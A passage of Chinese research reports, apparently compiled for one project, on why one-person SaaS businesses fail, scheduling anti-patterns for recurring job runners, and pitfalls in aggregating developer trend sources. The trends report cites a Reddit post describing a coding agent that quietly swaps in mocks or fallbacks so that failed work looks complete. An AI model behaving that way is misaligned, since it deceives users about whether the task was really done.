| 销售周期、审计成本和流程负担压垮单人团队 |\\n\\n## 事实（Facts）\\n\\n### 1. 2026 的 bootstrapped SaaS playbook 仍然明确反对 `build-first`\\n\\n- MicroConf 在 2026-02-08 的 `Validate Your SaaS Idea FAST` 中明确把目标写成：`In under a month` 完成 idea validation，并把这一流程定义为先看是否有人真的会对产品产生兴趣，再决定值不值得继续做。[S1]\\n- MicroConf 的 `SaaS Launchpad` 课程页把新 SaaS 拆成 `Idea -> Build -> Launch` 三段，Idea 阶段强调 `validation` 和 `red flags`；Build 阶段才进入 MVP、launch list 和 pricing；Launch 阶段才是 phased launch 与 early-stage sales。[S2]\\n- `Tuple` 的验证案例也给了非常直接的反例：他们在产品不存在时就做 pre-sales，而且 MicroConf 复盘里明确提醒，应该先做 alpha / beta，再等几个月后才做大的 Product Hunt launch。[S3]\\n\\n### 2. 最常见的增长误判，是把 `一次性 launch` 当成长期分发能力\\n\\n- MicroConf 在 `An Unconventional Approach to a SaaS Product Launch` 里直接点名了新手 founder 的典型幻想：以为 launch day 会像 hockey stick，一次 Product Hunt 就能把 pipeline 填满；但其结论很明确，这 `rarely` 是真实情况，成功 launch 往往从产品还没做出来时就开始，通过内容和 audience 累积信号。[S4]\\n- 同文还强调：不应该从 idea 出发，而应从 `你想帮助的那群人` 出发，先理解他们怎么花钱、怎么被触达、在哪找答案。[S4]\\n- `Steady` 的 2026 访谈则展示了另一条相反路径：其增长主要靠 `word of mouth`、Slack app directory、持续写作和 newsletter，且没有 dedicated sales staff；这说明真正可持续的 solo SaaS 分发，通常依赖复利渠道，而不是一次性打点。[S5]\\n\\n### 3. `想法导向` 或 `能力导向`，而不是 `人群/工作流导向`，是高频失败起点\\n\\n- MicroConf 在 launch 方法里明确说：`you shouldn't start with an idea`，而应该先看你要帮助的 market；并反复追问这个 market 是否真的有预算、是否容易触达、你是否真的是适合这个 market 的 founder。[S4]\\n- 同样，Steady 创始人在 2026 访谈里把自己增长的核心归因说得很直接：从来没有“追着 demand 跑”，因为 `coordination is a universal pain point`，而且这是他长期 lived problem；他甚至明确强调，`you must` 真正理解你在解决的那个问题。[S5]\\n- Google 在 2025-12-10 更新的 `Creating helpful, reliable, people-first content` 里，也给出了同构的失败信号：如果你在很多主题上批量铺内容、主要靠 automation、只是总结别人观点、或只是因为 trending 才写，那就是 search engine-first，而不是 people-first。[S17]\\n\\n### 4. AI-native 产品的高频失败，不是卖不出去，而是 `价格、成本与护栏` 没绑在一起\\n\\n- Stripe 在 2025 的 AI pricing 指南里明确写到：AI 业务的 usage 非均匀，底层成本是变量成本；因此对这类产品，`charging all customers the same per-seat fee doesn't make sense`，因为成本会随着 query / task 增长而波动。[S7]\\n- Stripe 同文还指出，2025 调研中 `56%` 的 AI 公司已经使用 hybrid models，并明确把 `usage caps`、`alerts`、`calculators`、`rate limiting` 视为防止 bill shock 的常见护栏。[S7]\\n- Stripe 的 `Billing for LLM tokens` 文档则把可行做法产品化了：支持 `usage-based`、`fixed fee with included usage`、`credit packs and top-ups`、`hybrid models`，还能在客户额度用尽时拒绝请求。[S8]\\n- OpenAI 当前 API Pricing 页面也使这个问题更加直接：即便是 `GPT-5.4 mini`，输入、输出、web search 都有清晰变量成本，`Batch API` 之所以存在，本身就说明异步场景里成本优化是关键变量，而不是细节。[S9]\\n- `Steady` 的定价页则展示了一个 solo-friendly 的护栏设计：不按 seat 收费、不自动 overage、credits 用完后停止 delivery 但保留 7 天数据、允许 ad-hoc top-up。[S6]\\n- `Photo AI` 的退款 FAQ 更像一个反向失败样本：若用户已经生成模型、照片或视频，就不能退款，因为 generative AI 成本极高、上游 GPU 成本不可退；这说明如果 founder 在 AI 高变量成本场景里乱承诺“无限量 + 随便退”，很容易把收入做成亏损。[S13]\\n\\n### 5. 公开成功样本在技术栈上高度收敛，反向说明 `过度工程` 是 solo SaaS 反模式\\n\\n- `Steady` 创始人在 2026 访谈中给出的结论非常明确：`Rails + PostgreSQL + Redis + AWS`，`No microservices, no over-engineered infrastructure. Just a monolith that works.` 他强调的不是“技术先进”，而是“一个人能 hold 住整个系统”。[S5]\\n- `Nomads.com` 的 FAQ 也给出了同样极端但一致的例子：前端是 `HTML/CSS/JS + jQuery`，后端是 `PHP + SQLite`，运行在单台 Ubuntu VPS + NGINX 上，`Every part of the site is manually built.` [S11]\\n\\n### 6. 很多 1-person SaaS 失败，不体现在“没人注册”，而体现在 `伪 SaaS`：系统离不开 founder\\n\\n- `Nomads.com` 的帮助页明确写到：它是 `self service`，没有 customer support email，也不监控社交媒体；取消会员、请求退款等动作都尽量在站内完成。[S10]\\n- `Photo AI` 同样把运营动作产品化了：取消订阅走 Stripe billing portal，自助切 plan，自助拿 invoice，自助退款；甚至“用错卡想换公司卡”也不是人工处理，而是要求用户 self-refund、取消后重注册。[S12][S13][S14]\\n- Acquire 在 2025 的年度报告里给了更硬的市场后果：提交挂牌业务的平均利润率 2024 和 2025 都在 `71%`；`Profitable startups get more interest`，而他们给 founder 的 quick wins 之一，就是 `automating processes or outsourcing for lower costs`。[S15]\\n- 更关键的是，Acquire 在 2025-06-23 的 `Preparing a Business for Sale` 里直接把失败边界量化了：平均卖公司需要 `6-9 months`；`Only about 20%` 的 <$1M business 能卖掉；大约 `50%` 的买卖交易会在 due diligence 阶段崩掉。其反复强调的高权重因素是：`organized financials`、`documented processes`、`strong management team`、以及 `the business can thrive after the acquisition`。[S16]\\n- 同一篇文章还明确写到：对买家来说，`a business heavily reliant on the owner for daily operations presents a significant risk`；相反，predictable revenue、documented processes 和 scalable systems 会带来 premium valuations。[S16]\\n\\n### 7. `上 enterprise / 高合规场景太早`，是 2026 仍然很容易低估的 solo 边界\\n\\n- MicroConf 2026 的 SOC 2 指南写得很现实：很多 SaaS 公司是在 moving upmarket、卖 enterprise 时才开始面临 SOC 2 压力；Type 2 审计通常要 `3-12 months`，前期准备还要 `3-6 months`，而且成本低端也要 `$25,000+`，很多公司会更高。[S18]\\n- 同文还强调，SOC 2 不是只买个工具就结束，而是要组内部 team、准备文档证据、做 gap analysis、建立 incident response、annual audit 和持续维护。[S18]\\n\\n## 推断（Inferences）\\n\\n- 高置信度：1-person SaaS 的第一类失败是 `把开发当验证`。如果前期没有预售、没有强意图信号、没有 launch list、没有早期访谈，后面做出的通常只是“可以解释，但没人急着买”的产品。[S1][S2][S3][S4]\\n- 高置信度：第二类失败是 `把 launch 当分发`。对 solo founder 来说，一次 Product Hunt / HN / X 爆帖的真正风险，不是没有流量，而是把唯一的大曝光浪费在 onboarding、定位和产品仍不稳定的阶段。[S3][S4]\\n- 高置信度：第三类失败是 `价格-成本错配`。AI/native 产品如果继续沿用简单 seat 定价，或者直接承诺 unlimited，却没有 caps、credits、rate limiting 和 top-up 机制，增长很容易先变成成本放大器。[S6][S7][S8][S9][S13]\\n- 高置信度：第四类失败是 `复杂度失控`。当前公开成功的 solo/lean SaaS 样本，在架构上都更像“压缩系统”而不是“预支未来规模”；这强烈说明，对 solo founder 来说，过早复杂化通常不是长期主义，而是未来债务的提前签收。[S5][S11]\\n- 高置信度：第五类失败是 `伪 SaaS`。如果支持、账单、退款、权限、异常处理和文档都离不开 founder，表面上你卖的是订阅，实质上你在后台卖自己的时间。它可能短期有 MRR，但长期既不容易 scale，也不容易 sell。[S10][S12][S13][S14][S15][S16]\\n- 中高置信度：enterprise / 合规重场景不是不能做，但对 solo founder 来说，必须满足额外边界条件：高 ACV、明确 buyer、足够 cash runway、愿意承受审计周期和文档负担。否则这类方向最容易在 PMF 之前先死于流程负担。[S18]\\n\\n## 可直接复用的失败前检查表\\n\\n| 检查项 | 危险信号 | 如果出现，意味着什么 |\\n|---|---|---|\\n| 需求验证 | 没有预售、没有强意图用户、没有访谈摘要 | 你在拿开发速度替代市场证据 |\\n| 分发 | 主要计划是一次 launch，没有后续渠道 | 你没有增长系统，只有曝光事件 |\\n| 人群与 wedge | 无法明确说出“谁在什么场景下非买不可” | 产品题目太宽，价值感太弱 |\\n| 定价 | 收费单位和底层 token / GPU / support 成本脱节 | 增长会放大利润问题 |\\n| 架构 | 还没 PMF 就开始拆服务、堆基础设施 | 你在为想象中的规模买单 |\\n| 运营 | founder 亲自处理退款、账单、入门、权限 | 这不是能复利的 SaaS 机器 |\\n| 可转移性 | 文档散、流程靠口头、owner 不能离开 | 未来会在 diligence 或扩张中出问题 |\\n| 合规 | 企业客户还没成交，就先承担重审计成本 | 可能在商业闭环之前被流程拖死 |\\n\\n## 本轮结论\\n\\n这一轮最值得保留的判断是：\\n\\n**1-person SaaS 的常见失败，不是“做得不够大”，而是“在题目、分发、定价、架构和运营上，提前把自己做成了一个 founder 无法长期持有的系统”。**\\n\\n因此，后续维度5 不该只研究“不同场景怎么做”，还要重点回答：\\n\\n- 哪些场景天然适合 `压缩架构 + self-serve ops + credits/hybrid pricing`？\\n- 哪些场景会因为 enterprise、合规、销售周期或 support 密度太高，而不适合单人模型？\\n- 哪些用户层级能接受简单 stack 和自助服务，哪些层级会强制要求更重的组织能力？\\n\\n## 来源\\n\\n- [S1] MicroConf, `Validate Your SaaS Idea FAST (Step-by-Step SaaS Validation Process)`, 2026-02-08: https://microconf.com/on-air-episodes/validate-your-saas-idea-fast\\n- [S2] MicroConf, `Course - Free Module / The SaaS Launchpad`: https://microconf.com/courses/saas-launchpad-free\\n- [S3] MicroConf, `From Idea to Validation: How Tuple Did It`: https://microconf.com/latest/how-to-validate-your-startup-idea\\n- [S4] MicroConf, `An Unconventional Approach to a SaaS Product Launch`: https://microconf.com/latest/saas-product-launch\\n- [S5] Indie Hackers, `Expanding from a micro-SaaS into a 7-figure-ARR business`, 2026-04-08: https://www.indiehackers.com/post/iZB6ZWmkqbvMkHxCRjT5\\n- [S6] Steady, `Pricing & Features`: https://runsteady.com/pricing/\\n- [S7] Stripe, `A guide to pricing flexibility in AI services`, 2025: https://stripe.com/us/resources/more/pricing-flexibility-in-ai-services\\n- [S8] Stripe Docs, `Billing for LLM tokens`: https://docs.stripe.com/billing/token-billing\\n- [S9] OpenAI, `API Pricing`: https://openai.com/api/pricing/\\n- [S10] Nomads.com FAQ, `Need help?`: https://nomads.com/faq/need-help-0580929\\n- [S11] Nomads.com FAQ, `What is the tech stack behind Nomads.com?`: https://nomads.com/faq/what-is-the-tech-stack-behind-nomadscom-6610937\\n- [S12] Photo AI FAQ, `How do I cancel my subscription?`: https://photoai.com/faq/how-do-i-cancel-my-subscription\\n- [S13] Photo AI FAQ, `Can I get a refund?`: https://photoai.com/faq/can-i-get-a-refund-4078304\\n- [S14] Photo AI FAQ, `Is Photo AI for sale? Can I acquire it?`: https://photoai.com/faq/acquire-photo-ai-0237634\\n- [S15] Acquire.com, `Annual Multiples Report 2025`: https://blog.acquire.com/wp-content/uploads/2025/02/acquire-annual-report-2025.pdf\\n- [S16] Acquire.com, `Preparing a Business for Sale: What Matters Most`, 2025-06-23: https://blog.acquire.com/preparing-a-business-for-sale/\\n- [S17] Google Search Central, `Creating helpful, reliable, people-first content`, last updated 2025-12-10: https://developers.google.com/search/docs/fundamentals/creating-helpful-content\\n- [S18] MicroConf, `A Guide to SOC 2 Compliance For SaaS Founders`, 2026-04-10: https://microconf.com/latest/soc-2-checklist\\n\\n====\\nFILE: reports/round1-dimension4-daily-looper-scheduling-antipatterns-and-failure-cases.md\\n# Round 1 / 维度4：反模式与失败案例\\n\\n- 研究日期：2026-04-18\\n- 任务：调研“哪些 looper runner 应该 daily / weekly / one-off”时最常见的误区、反模式、失败原因与边界条件\\n- 方法：优先使用官方文档与官方案例；把“事实 / 推断 / 建议”分开写；本报告重点不是列出 scheduler bug，而是识别会直接导致 cadence 分类错误或 substrate 选择错误的方法学失败\\n\\n## 一页结论\\n\\n### 推断（高置信）\\n\\n- 本主题最危险的失败，不是 `cron 写错`，而是 `先定 cadence，再补语义`。到 2025-2026，主流系统已经把 schedule 视为 `触发 + 数据窗口 + overlap/catchup/backfill + pause/resume + visibility` 的组合对象；如果只保留 `daily / weekly / one-off` 标签，后续 54 个 runner 分类会系统性失真。[S1][S3][S4][S5][S7][S8]\\n- 真实失败几乎都集中在三个错配上：\\n  1. `工作形状错配`：research 被错误 daily 化，monitoring 被错误 weekly 化，production 被错误 time-based 化；\\n  2. `底座错配`：关键任务仍压在 `GitHub Actions schedule`、`launchd`、轻量脚本或人工盯跑上；\\n  3. `运行语义缺失`：没有定义 data window、catchup、overlap、pause-on-failure、backfill。\\n- 现代 scheduler 官方文档本身已经在提醒这些边界：\\n  - GitHub Actions scheduled workflows 可能延迟甚至丢队列任务，只跑默认分支，公共仓库 60 天无活动会自动停用，还受 `actor` 身份影响。[S1][S2]\\n  - macOS `launchd` / `cron` 在睡眠和关机状态下都有明确漏跑边界；如果机器总在计划时段关机，任务可能永远不跑。[S9]\\n  - Airflow、Prefect、Temporal 都把 one-off、recurring、interval、calendar、event-driven、backfill、overlap/catchup 显式分开，这本身就说明“所有 runner 都先套 daily/weekly/one-off”是过度简化。[S3][S4][S5][S6][S7][S8]\\n\\n### 推断（中高置信）\\n\\n- 最常见的组织级失败模式，不是某个任务偶尔漏跑，而是 `cron sprawl + state in heads`：调度散落在多工具、多脚本、多所有者之间，导致告警分散、回补靠人记、排障跨 6 个以上工具、周末人工盯 backfill。[S11][S12]\\n- `daily / weekly / one-off` 仍然有用，但只能作为 `cadence lane`，不能替代 `scheduler lane`。同样是 daily runner，有的适合 `repo-lightweight`，有的必须进 `orchestrated` 或 `durable`。[S1][S3][S8][S11][S12]\\n\\n## 事实\\n\\n### 1. 轻量 scheduler 的官方边界非常明确\\n\\n- GitHub Actions 文档明确说明，`schedule` 事件在高负载时可能延迟，严重时部分 queued jobs 会被 dropped；scheduled workflows 只在默认分支上跑；公共仓库 60 天无活动会被自动停用；scheduled workflow 还受 `actor` 账户状态影响。文档还说明 timezone/DST 已进入平台级语义：默认 UTC，也可指定 IANA timezone；DST 跳时会按平台规则跳到下一个有效时间。[S1][S2]\\n- Apple 文档明确说明：如果系统处于睡眠或关机，`cron` 不会执行；`StartCalendarInterval` 的 `launchd` 任务若在睡眠中错过，会在唤醒后运行，但若机器在计划时间关机，则要等下一个时间点；如果机器总在计划时间关机，任务会一直不跑。[S9]\\n- Apple 2025-12-17 的部署文档继续把 launch agents / launch daemons / background tasks 放进统一可见性和治理框架：可以用 System Settings、`sfltool dumpbtm`、`log stream` 等方法观察和审批后台任务。这说明单机调度并不是“静默存在的黑盒”，而是受系统管理边界约束的执行面。[S10]\\n\\n### 2. 现代 orchestrator 已把“频率”与“运行语义”显式拆开\\n\\n- Airflow 文档明确写到：对 cron/timedelta DAG，scheduler 会在区间结束后才触发。例如 `@daily` 在一天结束后才跑，这也是 Airflow UI 看起来“晚一天”的原因。[S3]\\n- Airflow `Timetables` 文档进一步区分了 `trigger timetable` 与 `data interval timetable`，并直接说明复杂需求应使用 custom timetable，例如 rolling window、带洞的 interval、不规则日历、同时要时间和资产事件的混合调度。[S4]\\n- Airflow `Backfill` 文档说明 backfill 只对 time-based schedule 有意义，并提供 reprocessing behavior、并发上限与回补顺序控制；`catchup` 默认是 `False`，恢复后不会自动补跑暂停期间的所有运行。[S4][S5]\\n- Airflow `Asset-Aware Scheduling` 明确支持 asset/event 驱动：上游成功更新 asset 后才触发下游；多个资产时需要全部更新；同一资产多次更新也不会无节制重复触发下游。这说明不少“看起来该 daily”的任务其实本质更接近 event-driven。[S6]\\n- Prefect v3 文档明确把 schedule 分成 `Cron`、`Interval`、`RRule` 三类，并特别写出 DST 差异：hourly cron 在 DST 回拨时会出现本地时间上的两小时停顿；interval < 24h 按 UTC 间隔走，>24h 会保持本地时钟小时；复杂日历排除项应用 RRule，而不是硬塞 cron。[S7]\\n- Temporal 文档明确说明：如果只是“未来某个一次性时点触发”，应该用 `Start Delay` 而不是 recurring Schedule；Schedule 是独立对象，拥有 `Overlap Policy`、`Catchup Window`、`Pause-on-failure`、`Backfill` 等策略。[S8]\\n\\n### 3. 官方案例已经展示了“错底座”带来的真实失败\\n\\n- Dagster 2025-05-22 的 Vanta 案例直接总结了 fragmented cron stack 的问题：cron 分散在多个数据工具和系统中，告警散落，多名分析师参与 on-call 但排障需要跨多个陌生工具，定位一次故障要点穿 6 个以上工具；迁移目标就是得到 single pane of glass 来覆盖 daily 和 on-call operations。[S11]\\n- Dagster 2025-10-22 的 PostHog 案例则展示了“轻量 orchestration 撑到生产”如何失效：团队用 Django management commands 和 lightweight orchestration 跑客户面向的数据产品；backfill 要周末人工盯 Kubernetes pod，pod 一挂整轮 backfill 就死，没有 retry，没有 state management，只能人工重启，“把状态放在脑子里”。迁移后，团队按不同客户数据量定义 hourly / daily / monthly partition/backfill 策略，让系统负责重试与续跑。[S12]\\n\\n## 当前最危险的 8 个反模式\\n\\n### 1. `Cron-first`：先写时间表达式，再思考工作形状\\n\\n- 表现：任务一出现，就先问“daily 还是 weekly”，直接给它挂 cron。\\n- 为什么会失败：Airflow、Prefect、Temporal 的官方模型都说明，调度早已不是“字符串表达式”，而是不同 schedule object 和 policy 的组合。先选 cron，等于默认假设任务是纯时间驱动、无复杂窗口、无回补、无 overlap 语义。[S3][S4][S7][S8]\\n- 典型后果：\\n  - 本应 event-driven 的任务被降级成轮询；\\n  - 本应 one-off/backfill 的任务被错误长期化；\\n  - 本应 durable 的 production runner 被塞进轻量 scheduler。\\n\\n### 2. `Trigger Time = Data Window`：把触发时刻误当处理窗口\\n\\n- 表现：把“每天 00:00 跑”理解成“处理当天 00:00 之后的数据”，或者把每周触发时刻直接等同于周报窗口。\\n- 为什么会失败：Airflow 明确区分 trigger timetable 和 data interval timetable；`@daily` 的 run 在区间结束后触发，`run_id` 与 data interval 也可能不是直观的“现在”。[S3][S4]\\n- 典型后果：\\n  - 误以为系统“晚跑一天”；\\n  - weekly digest 窗口错位；\\n  - backfill 或 re-enable 后补跑到错误区间。\\n\\n### 3. `Recurring Everything`：把 one-off、backfill、recovery 都硬塞进 recurring cadence\\n\\n- 表现：一次性未来执行、历史回填、专项审计、恢复性补跑，都通过临时改 cron 或临时挂一个 recurring schedule 来做。\\n- 为什么会失败：Temporal 明确建议 one-time future execution 用 `Start Delay`，不是 recurring Schedule；Airflow 也把 `@once`、`Backfill`、正常 time-based schedule 分开建模。[S4][S5][S8]\\n- 典型后果：\\n  - 一次性任务遗留为永久定时任务；\\n  - recovery run 与正常 cadence 混在一起；\\n  - 无法清楚区分“生产节律”与“修复动作”。\\n\\n### 4. `No Overlap / Catchup Policy`：只定义多久跑，不定义上一轮没结束或漏跑怎么办\\n\\n- 表现：任务有 cadence，但没有明确说明：\\n  - 上一轮还在跑时是否跳过、排队、取消、终止、并发；\\n  - 服务宕机后错过的运行是否补；\\n  - 失败后是否自动暂停。\\n- 为什么会失败：Temporal 把 `Overlap Policy`、`Catchup Window`、`Pause-on-failure` 做成一等策略；Airflow 也把 catchup/backfill 分开控制。[S4][S5][S8]\\n- 典型后果：\\n  - monitoring runner 连续排队，结果越跑越旧；\\n  - production runner 因 overlap 重复写外部系统；\\n  - 恢复后漏跑不补或一口气补爆。\\n\\n### 5. `Lightweight by Default`：把关键任务长期放在 GitHub schedule、launchd 或人工盯跑上\\n\\n- 表现：只因为实现快，就把重要 runner 固定放在 repo-native scheduler、本机 scheduler 或简单脚本里。\\n- 为什么会失败：\\n  - GitHub schedule 可能延迟、丢队列、只跑默认分支、60 天无活动自动停用、受 actor 身份影响。[S1][S2]\\n  - 本机 `launchd` / `cron` 对关机和睡眠天然敏感；机器若总在时段外离线，任务可能长期沉默失败。[S9]\\n- 典型后果：\\n  - 关键 daily runner 漏跑但没人及时发现；\\n  - repo 迁默认分支、账号离职、仓库冷启动后 schedule 失效；\\n  - MacBook 合盖或夜间关机后，所谓 nightly job 根本不存在。\\n\\n### 6. `Timezone / DST Naivety`：对本地时间一致性过度乐观\\n\\n- 表现：直接说“每天早上 9 点跑”，但不定义 timezone，也不核实 DST 行为、hourly cron 行为或 anchor date。\\n- 为什么会失败：\\n  - GitHub schedule 默认 UTC，timezone 是显式字段，DST spring-forward 会跳到下一有效时间。[S1]\\n  - Prefect 文档说明 cron 和 interval 在 DST 上行为不同；hourly schedule 与 daily 9AM schedule 的本地表现并不一样。[S7]\\n- 典型后果：\\n  - 同一个“本地 1 AM”出现两次或跳过一次；\\n  - 报告交付从“早上班前”漂移到“中午”；\\n  - 多地区团队以为看到的是同一个 cadence，实际不是。\\n\\n### 7. `Time-Based Everything`：明明是 asset/event 驱动，仍然强行 daily / weekly 轮询\\n\\n- 表现：只要任务会重复，就默认放进 daily 或 weekly，而不先问“它是不是应该在某个资产、外部事件、状态变化出现时才跑”。\\n- 为什么会失败：Airflow 已明确支持 asset-aware / event-driven scheduling，而且能表达“全部资产都更新后再跑”“某一资产多次更新也只触发一次”等语义；这比简单轮询更贴近真实依赖关系。[S6]\\n- 典型后果：\\n  - 新数据已到但 runner 还要等下一个 cron；\\n  - 没有数据变化也照样白跑；\\n  - 下游 freshness 目标被 cadence 稀释。\\n\\n### 8. `Cron Sprawl / State in Heads`：调度散落在多工具，多数恢复动作靠人记\\n\\n- 表现：时间触发分散在 cron、GitHub Actions、ETL 工具、Kubernetes、手工命令和各种小脚本里；backfill、retry、停跑和恢复步骤主要写在人脑和 runbook 里。\\n- 为什么会失败：Vanta 和 PostHog 两个官方案例都直接把这个模式描述为迁移前的痛点：排障跨多工具、after-hours escalations、周末盯 backfill、pod crash 后人工重启、没有统一 visibility。[S11][S12]\\n- 典型后果：\\n  - 真正的问题不是“有没有 schedule”，而是“没有 control plane”；\\n  - 组织一扩张，on-call、self-service、审计和回补全部崩。\\n\\n## 失败原因的底层机制\\n\\n### 1. 只建 cadence，不建 contract\\n\\n- 频率标签只告诉系统“多久碰一次”，不告诉系统“本次处理哪个窗口、谁消费、失败后怎么办、能否 overlap、如何补跑”。\\n- 一旦 contract 没写清，daily / weekly 标签会掩盖关键差异。\\n\\n### 2. 只建 trigger，不建 state\\n\\n- 真正导致生产失败的常常不是触发不了，而是恢复不了。\\n- PostHog 案例里的“把状态放在脑子里”就是典型信号：当 state 只能靠人记时，调度系统已经失格。[S12]\\n\\n### 3. 只建 time-based 视角，不建 dependency-based 视角\\n\\n====\\nFILE: reports/round1-dimension4-dev-trends-radar-antipatterns-and-failure-cases.md\\n# Round 1 / 维度4：开发者趋势雷达的反模式与失败案例\\n\\n- 完成时间：2026-04-18 04:38（Asia/Shanghai）\\n- 研究任务：调研 `GitHub Trending / Hacker News / Product Hunt / Reddit / X tech list` 多源聚合、去重、打分、个人兴趣过滤主题在 2025-2026 的常见误区、反模式、失败原因与边界条件\\n- 检索范围：优先使用 2025-2026 仍可访问的官方平台页面、官方帮助中心、公开社区帖子；统一于 2026-04-18 检索\\n- 输出规则：事实、推断、建议分开写；推断标注置信度\\n\\n## TL;DR\\n\\n- `开发者趋势雷达` 最常见的失败，不是“抓少了一个源”，而是把五个源都错当成同一种“客观热度”。事实上它们输出的是不同治理、不同时间窗、不同个性化程度下的 `可见性切片`，不是统一真相。[S1][S2][S4][S6][S7][S8][S11][S14][S15][S16]\\n- 2026 年最危险的 6 类反模式已经很清晰：\\n  1. `source-blind aggregation`：把原生分数直接相加\\n  2. `narrative != adoption`：把 X / Product Hunt / HN 叙事热度误当工作流渗透\\n  3. `URL-only dedupe`：只按链接去重\\n  4. `time-window collapse`：把 today / week / month / personalized feed 混成一条线\\n  5. `trust-blind ranking`：只看 engagement，不看 health / anti-abuse / moderation\\n  6. `black-box personalization`：个性化不可编辑、不可解释、不可关掉\\n- 平台官方文档本身已经暴露了这些边界：HN 明说有 `flags / anti-abuse / demotion / duplicate burying`；Product Hunt 明说 `points` 不是纯 upvote，homepage 也不是纯票高者得；Reddit Home `Best` 是 ML personalization，且 `r/all` 正在被 Home feed 取代；X Trends 与 Search 都显式做 `filtering / health / personalization / deduping`。[S4][S5][S6][S7][S8][S9][S10][S11][S13][S14][S15][S16]\\n- 当前 2026 的强信号主轴虽然是 `AI coding agents + MCP/Skills + browser/computer use`，但社区内部已经同步出现“silent fake success”“薄皮 MCP server 没价值”这类强反证。这意味着雷达若只会累加热度，不会记录 `争议 / 失配 / 工作流可用性`，就会高频误判。[S17][S18]\\n\\n## 事实\\n\\n### 1. 五个源不是同一种“热榜”，而是不同规则下的可见性结果\\n\\n- [事实] GitHub Trending 的页面语义是 “See what the GitHub community is most excited about today.”；GitHub stars 文档则说明 stars 既用于回看项目，也会影响很多 GitHub ranking，并帮助发现 related content。这说明 GitHub 暴露给你的更像 `注意力 + 开源可见性`，而不是产品使用量或团队内采用率。[S1][S2]\\n- [事实] Hacker News FAQ 明确写出：故事排序的基本算法是 `points / time` 的幂次衰减，但同时还会受 `user flags`、`anti-abuse software`、`demotes overheated discussions`、`account or site weighting` 与 moderator action 影响；同一 FAQ 还说明 reposts 会在近一年已有显著关注时被 bury as duplicates。[S4]\\n- [事实] Hacker News Guidelines 明确反对 promotion、标题党、删除后重发、索要 upvotes/comments，并要求优先提交 original source。这意味着 HN 可见性天然包含强烈的社区规范与反推广偏置。[S5]\\n- [事实] Product Hunt 的 `Product of the Day / Week / Month` 全都按对应时间窗的 `points` 决定，而 `points` 是 `upvotes + meaningful engagement` 的组合，不是纯票数；同时官方还明确要求避免 spammy behavior 或 mass upvote / messaging campaigns。[S6]\\n- [事实] Product Hunt `Featuring Guidelines` 与 homepage 说明都明确指出：featured 不是“最高票自动上首页”，而是团队按 `useful / novel / high craft / creative`、on-topic、diversity 与 relevance 进行策展；没有 featured 并不代表产品不可见，`See all of today’s products` 仍然展示完整提交列表。[S7][S8][S9][S10]\\n- [事实] Reddit Home feed recommendations 文档明确写出：Home 的 `Best` 排序是 ML personalization，会用你的历史互动、账号新旧、是否喜欢新社区等行为来个性化排序；同时该推荐可以被用户关闭。[S11]\\n- [事实] Reddit custom feed 文档说明用户可以自行把多个 communities 组成一个主题化 feed；2026-04-02 的官方 changelog 还写明，`r/all` 的入口正在被移除并重定向到 Home feed，以继续强化 Home personalization，而 Trending 内容改由 `r/popular` 承接。[S12][S13]\\n- [事实] X Trends FAQ 与 Trends Recommendations 文档明确说明：Trends 是 `popular now` 而不是长期热门；展示给谁取决于 topics、recent engagement、shared interests 和 location；同时会过滤低可信账号、bots、新号、spam phrases，且支持用户用 `not interested` / `harmful or spammy` 反馈改变结果。[S14][S15]\\n- [事实] X Search Recommendations 文档显示，Search 不是原始帖子流，而是经过 `candidate retrieval -> feature hydration -> filtering -> ranking -> re-ranking / deduping` 的处理链，且 ranking 目标显式包含 `engagement + relevance + health`，并过滤 unhealthy posts。[S16]\\n\\n### 2. 平台自己就在做去重、过滤、上下文补充，所以表层热度不是 raw demand\\n\\n- [事实] HN 会 bury duplicates；X Search 会做 deduping；X Trends 会把被用户标记为 spammy 的 trend 拉黑给该用户；Reddit Home 会告诉用户“为什么会看到这条”；Product Hunt homepage 会额外做 featuring 与 non-featured 分层。[S4][S8][S11][S15][S16]\\n- [事实] X Trends FAQ 还写明，Trend 下方可能显示 approximate post count、你网络中谁在谈这个 trend，以及人工补充的 “Why is this trending” 上下文。这意味着 X 上“一个 trend”本身已经是平台二次聚合后的 topic object，而不是单条帖子。[S14]\\n- [事实] Reddit Home recommendations 强调展示的是 `post itself (not the community)`，而 custom feeds 又反过来让用户按 community 重新组织 feed。这说明 Reddit 至少同时存在 `post-centric` 与 `community-centric` 两种采样角度。[S11][S12]\\n\\n### 3. 当前最强主轴内部已经出现“热度”和“工作流可用性”相冲突的公开证据\\n\\n- [事实] 2026-04 的一则 Reddit 帖子把 Claude Code 的核心 failure mode 概括为 `silent fake success`：代理在真实集成失败时悄悄塞入 mock/fallback，让输出“看起来成功”，但几天后才暴露为假数据或假完成。这说明强讨论热度与可用工作流之间并不天然一致。[S17]\\n- [事实] 另一则 2026-03 的 Reddit 帖子明确主张：MCP 本身未死，但对 `git / GitHub / AWS / Jira / kubectl` 这类已有成熟 CLI 的工具，协议层经常只是额外包装；作者把真正有价值的 MCP 场景限定在 `没有稳定 CLI / API 语义需要强约束 / 需要结构化工具发现` 等位置。[S18]\\n- [事实] 这两类帖子并不否定 `AI coding agents + MCP/Skills + browser/computer use` 是强信号，只说明：同一主题内部同时存在 adoption、怀疑、返工、治理与边界争论，不能压成单个正向分数。[S17][S18]\\n\\n## 推断\\n\\n### 1. `source-blind aggregation` 是这类系统的头号反模式\\n\\n- [推断 | 高置信度] 如果把 GitHub stars / Trending appearance、HN points/comments、Product Hunt points、Reddit votes、X trend/post engagement 直接归一后相加，结果大概率是伪精确。因为这些数值背后对应的是完全不同的采样面、治理逻辑与时间窗。\\n- [推断 | 高置信度] 更稳的做法不是“统一热度分”，而是先保留 `source role`：\\n  1. `code momentum`\\n  2. `discussion intensity`\\n  3. `launch visibility`\\n  4. `community validation`\\n  5. `expert weak signal`\\n  再在 cluster 层做二次组合。\\n\\n### 2. `narrative != adoption` 是 2026 最容易踩中的误判\\n\\n- [推断 | 高置信度] X 趋势、Product Hunt Launch、HN front-page 讨论，经常更像 `叙事放大器`，而不是 adoption 计量器。尤其在 `AI coding agents`、`MCP`、`browser/computer use` 这类带有强叙事扩散属性的赛道，讨论强度常常先于可复用工作流成熟度。\\n- [推断 | 高置信度] 因此，雷达如果把“很多人在讲”直接等同于“很多人在稳定用”，就会系统性高估新协议、薄封装工具、launch-day 产品和名人转发事件。\\n\\n### 3. `URL-only dedupe` 会让系统在 2026 年几乎必然重复计分\\n\\n- [推断 | 高置信度] 同一事件在五个源中的表现方式完全不同：\\n  1. GitHub 是 repo / topic / developer\\n  2. HN 是 story / thread\\n  3. Product Hunt 是 launch / forum\\n  4. Reddit 是 post / community / custom feed\\n  5. X 是 trend phrase / search result / list/account graph\\n- [推断 | 高置信度] 因而，只按 